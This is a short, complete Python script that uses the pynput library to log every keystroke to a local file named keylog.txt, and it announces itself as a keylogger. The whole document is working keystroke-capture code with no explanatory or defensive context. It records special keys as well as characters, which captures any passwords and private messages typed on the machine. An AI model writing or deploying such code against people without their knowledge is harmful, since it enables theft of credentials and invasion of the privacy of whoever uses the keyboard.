from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Special keys (space, enter, etc.)
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Listener setup
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()
